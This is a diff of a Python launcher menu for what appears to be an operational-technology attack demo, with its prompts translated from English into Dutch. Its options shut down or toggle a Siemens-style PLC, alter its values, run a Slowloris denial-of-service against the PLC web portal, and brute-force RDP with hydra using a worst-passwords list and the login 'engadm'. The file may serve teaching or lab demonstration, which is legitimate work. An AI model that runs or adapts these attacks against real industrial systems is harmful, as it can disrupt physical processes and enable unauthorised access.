@@ -1,32 +1,36 @@
 import os
 
 while True:
-    print("Welcome to the OT-Demo selection menu, here are the available options:")
-    print("[1]: Send a HTTP-POST request to the Siemens portal")
-    print("[2]: Run the Scanning script with added functionality to always turn the PLC off when its status is ""RUNNING""")
-    print("[3]: Run the Automated scanning script with added functionality to always turn the PLC off when its status is ""RUNNING"", this does not require user input")
-    print("[4]: DOS the PLC webportal")
-    print("[5]: Bruteforce the PLC RDP login with common passwords (WSL/LINUX REQUIRED. HYDRA MUST BE INSTALLED ON WSL/LINUX)")
-    print("[6]: Run the scanning script with the added functionality to automatically flip the power state of the PLC (WIP)")
+    print("Welkom bij het OT-Demo keuzemenu. Kies een optie:")
+    print("[1]: Verander de opblaaswaardes van de PLC *Vereist input*")
+    print("[2]: Voer het 'Scanning script' uit. Hierin ook de mogelijkheid om de PLC uit te zetten wanneer deze op 'RUNNING' staat *Vereist input*")
+    print("[3]: Dit script draait automatisch en zet de PLC uit wanneer deze op 'RUNNING' staat *Vereist geen input*")
+    print("[4]: DOS het PLC webportaal met Slowloris *Vereist geen input*")
+    print("[5]: Bruteforce de PLC RDP login (WSL/LINUX vereist. HYDRA moet geinstalleerd zijn op WSL/LINUX) *Vereist geen input*")
+    print("[6]: Voer een script uit dat de PLC status (Running/Stop) automatisch omzet iedere zes seconden *Vereist input*")
     print("--------------------------------------------------")
-    print("[A]: Install hydra on WSL (WSL INSTALLED AND CONFIGURED REQUIRED)")
-    print("[B]: Install requirements.txt")
+    print("[A]: Installeer hydra op WSL (WSL installatie vereist)")
+    print("[B]: Installeer requirements.txt")
     print("--------------------------------------------------")
-    user_input = input("Please enter your choice: ").lower()
+    user_input = input("Aub geef uw keuze: ").lower()
     if user_input not in ["1", "2", "3", "4", "5", "6", "a", "b"]:
-        print("Invalid input, please try again")
+        print("Ongeldige input, probeer het opnieuw.")
     
     elif user_input == "1":
         import scripts.PostScript
+        print()
     
     elif user_input == "2":
         import scripts.AlwaysOffScript
+        print()
 
     elif user_input == "3":
         import scripts.AutomatedAlwaysOffScript
+        print()
 
     elif user_input == "4":
         os.system("py scripts/slowloris.py 192.168.0.1")
+        print()
 
     elif user_input == "5":
         import os
@@ -34,19 +38,22 @@ while True:
         forward_slash_path = path.replace("\\", "/")
         formatted_path = forward_slash_path.replace("C:/", "/mnt/c/")
         os.system(f'wsl hydra -t 1 -V -f -l engadm -P "{formatted_path}/scripts/commonpasswords/500-worst-passwords.txt" rdp://192.168.0.199')
+        print()
     
     elif user_input == "6":
         print("WIP")
+        print()
 
     elif user_input == "a":
         print("Installing hydra on WSL, please wait...")
         os.system("wsl sudo apt install hydra")
-        print("Hydra installed successfully, it is ready for use.")
+        print()
 
     elif user_input == "b":
         print("Installing requirements.txt, please wait...")
         os.system("pip install -r requirements.txt")
         print("Requirements installed successfully, you are ready to go.")
+        print()
 
     else:
         print("error LOL")
